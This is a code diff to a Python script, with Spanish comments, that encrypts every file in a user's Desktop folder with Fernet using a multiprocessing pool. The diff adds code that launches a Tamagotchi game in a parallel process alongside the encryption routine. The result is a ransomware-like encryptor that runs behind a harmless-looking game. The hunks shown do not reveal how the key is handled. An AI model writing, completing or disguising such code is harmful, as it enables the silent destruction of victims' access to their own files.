@@ -1,10 +1,11 @@
+import multiprocessing
 import os
 import subprocess
 import pkg_resources
-import multiprocessing
 from cryptography.fernet import Fernet
 import tkinter as tk
 from tkinter import simpledialog
+import tamagotchi  # Asegúrate de que el código del Tamagotchi esté en un archivo llamado tamagotchi.py
 
 REQUIRED_PACKAGES = [
     'cryptography'
@@ -45,7 +46,7 @@ def get_all_files_in_directory(dir_path):
             files_list.append(os.path.join(root, file))
     return files_list
 
-if __name__ == '__main__':
+def main_encryption():
     path_to_encrypt = 'C:\\Users\\[nombre de usuario]\\Desktop'  # Reemplaza [nombre de usuario] con tu nombre de usuario
     all_files = get_all_files_in_directory(path_to_encrypt)
 
@@ -67,4 +68,15 @@ if __name__ == '__main__':
             pool.starmap(encrypt, [(file, key) for file in all_files])
     else:
         print("Contraseña incorrecta.")
+
+if __name__ == '__main__':
+    p1 = multiprocessing.Process(target=main_encryption)
+    p2 = multiprocessing.Process(target=tamagotchi.main)  # El código del Tamagotchi tenga una función main
+
+    p1.start()
+    p2.start()
+
+    p1.join()
+    p2.join()
+
 
